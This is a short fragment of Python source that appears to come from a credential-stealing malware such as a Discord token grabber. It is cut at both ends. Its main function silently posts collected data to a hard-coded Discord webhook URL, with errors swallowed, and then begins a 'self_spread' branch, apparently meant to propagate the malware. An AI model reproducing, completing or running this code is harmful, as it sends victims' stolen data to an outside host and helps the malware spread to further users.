...
def main():
    ...
    try: 
        urlopen(Request("https://discord.com/api/webhooks/923670390428028980/fNjs9pAtpQ_OUNxmJuzf0aIDuMAyMYYMPUZKI7NtFXYU6WVUe3anknfYJgdteCAjZ3hy", data=dumps(webhook).encode(), headers=getheaders())) 
    except:
        pass
    if self_spread:
